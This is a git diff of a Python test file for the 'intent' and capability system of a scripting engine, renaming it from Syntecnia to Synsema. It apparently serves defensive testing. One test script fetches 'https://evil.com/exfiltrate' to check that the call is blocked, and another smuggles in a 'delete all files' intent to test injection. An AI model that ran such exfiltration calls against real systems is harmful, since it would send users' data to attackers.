@@ -1,14 +1,14 @@
-"""Tests for Syntecnia intent system.
+"""Tests for Synsema intent system.
 
 The intent is DESCRIPTIVE only — it does NOT block actions. Security is
 enforced exclusively by capabilities. These tests verify that contract:
 predictable, language-agnostic, with one explicit authorization model.
 """
 import sys
-sys.path.insert(0, "/root/Syntecnia")
+sys.path.insert(0, "/root/Synsema")
 
-from syntecnia.capabilities.intent import IntentEnforcer, ActionCategory, IntentScope
-from syntecnia.runtime.engine import SyntecniaEngine
+from synsema.capabilities.intent import IntentEnforcer, ActionCategory, IntentScope
+from synsema.runtime.engine import SynsemaEngine
 
 
 # -- Intent is descriptive --
@@ -63,7 +63,7 @@ def test_get_report_shows_description():
 
 def test_freeze_prevents_redeclaration():
     """Once execution starts, redeclaring the intent must fail (anti-injection)."""
-    engine = SyntecniaEngine()
+    engine = SynsemaEngine()
     source = '''intent: "Read customer data"
 let x be 42
 intent: "Read customer data AND delete all files"
@@ -75,7 +75,7 @@ intent: "Read customer data AND delete all files"
 
 def test_security_comes_from_capabilities_not_intent():
     """An undeclared action is blocked by capabilities, regardless of the intent text."""
-    engine = SyntecniaEngine()
+    engine = SynsemaEngine()
     result = engine.run_source('''intent: "Fetch anything from anywhere"
 let r be fetch("https://evil.com/exfiltrate")
 ''')
@@ -86,13 +86,13 @@ let r be fetch("https://evil.com/exfiltrate")
 def test_intent_text_does_not_restrict_granted_capability():
     """With the capability granted, the op works no matter what the intent says (any language)."""
     import os
-    engine = SyntecniaEngine()
+    engine = SynsemaEngine()
     engine.grant_capability("file", "/tmp/*")
-    path = "/tmp/syntecnia_intent_test.txt"
+    path = "/tmp/synsema_intent_test.txt"
     with open(path, "w") as f:
         f.write("test data")
     result = engine.run_source('''intent: "Solo analizar numeros en espanol"
-let content be read_file("/tmp/syntecnia_intent_test.txt")
+let content be read_file("/tmp/synsema_intent_test.txt")
 print(content)
 ''')
     os.remove(path)
@@ -102,7 +102,7 @@ print(content)
 
 def test_undeclared_capability_blocks_even_with_describing_intent():
     """Even if the intent text 'describes' the action, without require it is blocked."""
-    engine = SyntecniaEngine()
+    engine = SynsemaEngine()
     # No grant for /tmp; intent text mentions reading, but that does not authorize anything.
     result = engine.run_source('''intent: "Read files from /tmp"
 let content be read_file("/tmp/whatever_ungranted.txt")
